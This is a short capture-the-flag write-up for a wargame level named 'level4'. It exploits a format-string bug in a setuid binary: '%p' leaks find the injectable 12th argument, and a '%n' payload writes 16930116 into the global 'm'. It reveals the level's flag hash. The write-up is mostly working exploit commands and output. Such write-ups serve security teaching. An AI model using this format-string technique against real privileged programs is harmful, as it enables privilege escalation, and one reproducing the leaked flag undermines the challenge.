# level4

```sh
$> ls -l ~
-rwsr-s---+ 1 level6 users 5385 Mar  6  2016 level5
```

```sh
$> python -c 'print("A"*4 + "%p "*16)' | ./level4
AAAA0xb7ff26b0 0xbffff784 0xb7fd0ff4 (nil) (nil) 0xbffff748 0x804848d 0xbffff540 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x25207025 0x70252070 0x20702520 0x25207025
```
As we can see, the 12th pointer displayed is injectable.  


```sh
$> gdb -q level4
(gdb) info variables
[...]
0x08049810  m
```

We just have to write the value `16930116` into the m variable.  
To do that, we just pad `16930116` - `4` bytes for the address of `m()` into the 12th pointer :

```sh
$> python -c 'print("\x10\x98\x04\x08" + "%16930112d" + "%12$n")' | ./level4
[...]
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
